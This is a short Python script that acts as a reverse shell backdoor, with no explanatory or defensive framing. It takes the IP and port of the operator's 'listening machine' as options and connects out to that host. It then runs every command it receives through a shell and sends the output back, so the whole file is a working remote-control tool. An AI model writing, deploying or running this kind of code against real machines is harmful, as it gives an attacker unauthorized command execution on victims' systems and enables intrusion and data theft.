#!/usr/bin/env python

import socket
import subprocess
import optparse


def execute(command):
    return subprocess.check_output(command, shell=True)


def get_args():
    parser = optparse.OptionParser()
    parser.add_option("-i", "--ip", dest="ip", help="IP of your listening machine")
    parser.add_option("-p", "--port", dest="port", help="Port you want to listen on")
    options, arguments = parser.parse_args()

    if not options.ip:
        parser.error("[-] Please specify an IP of your listening machine, use -i [IP]/--ip [IP] to do so or use "
                     "--help for more info")

    if not options.port:
        parser.error("[-] Please specify a PORT on which you want to listen, use -p [PORT]/--port [PORT] to do so or "
                     "use --help for more info")

    return options


options = get_args()

connection = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
connection.connect((options.ip, int(options.port)))

connection.send("\n[+] Connection established\n")

while True:
    command = connection.recv(1024)
    try:
        command_output = execute(command)
        connection.send(command_output)
    except subprocess.CalledProcessError:
        connection.send("[-] Unrecognised command\n")


connection.close()

